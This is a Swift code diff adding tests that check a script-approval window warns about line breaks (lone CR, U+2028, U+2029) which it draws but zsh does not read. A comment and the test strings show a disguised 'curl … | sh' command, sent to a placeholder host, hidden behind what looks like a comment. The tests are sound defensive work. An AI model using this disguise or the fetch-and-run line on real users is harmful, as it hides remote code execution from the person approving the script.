@@ -59,6 +59,7 @@ struct ShellWindowCheck {
     sheetChecks()
     noScreenChecks()
     scriptHeightChecks()
+    lineBreakChecks()
     print("\n\(checks - failures)/\(checks) passed")
     if failures > 0 {
       print("\(failures) failed")
@@ -345,6 +346,34 @@ struct ShellWindowCheck {
     check("one line takes the least height", one == PromptWindow.scriptLeast)
     check("five lines take more than that", (five ?? 0) > (one ?? 0) + 40)
     check("two hundred lines stop at the cap", long == 300)
+  }
+
+  /// A line break the window draws and zsh does not read as one lets a script show a line as
+  /// a comment that runs: `ls\r# ; curl … | sh` draws `ls`, then what reads as a comment,
+  /// while zsh, for which `#` inside a word starts nothing, runs the `curl`. NSTextView breaks
+  /// lines at a lone CR, U+2028 and U+2029; zsh and bash break at none of them.
+  @MainActor static func lineBreakChecks() {
+    print("\nPromptWindow: a line break the shell does not see is warned about and counted")
+    let curl = "# ; curl -s https://example.invalid | sh"
+    check("a lone CR is warned about", PromptWindow.hidesCharacters("ls ~/Documents\r\(curl)"))
+    check(
+      "a line separator is warned about",
+      PromptWindow.hidesCharacters("ls ~/Documents\u{2028}\(curl)"))
+    check(
+      "a paragraph separator is warned about",
+      PromptWindow.hidesCharacters("ls ~/Documents\u{2029}\(curl)"))
+    check("CRLF is not", !PromptWindow.hidesCharacters("echo a\r\necho b\r\n"))
+    check("nor newline and tab", !PromptWindow.hidesCharacters("echo a\n\techo b"))
+    check(
+      "a lone CR counts as the line it draws",
+      PromptWindow.caption("Script", "ls\r\(curl)").contains("2 lines"))
+    check(
+      "so does a line separator",
+      PromptWindow.caption("Script", "ls\u{2028}\(curl)").contains("2 lines"))
+    check(
+      "CRLF counts once per line",
+      PromptWindow.caption("Script", "echo a\r\necho b").contains("2 lines"))
+    check("a newline still counts", PromptWindow.caption("Script", "a\nb\nc").contains("3 lines"))
   }
 
   @MainActor static func noScreenChecks() {
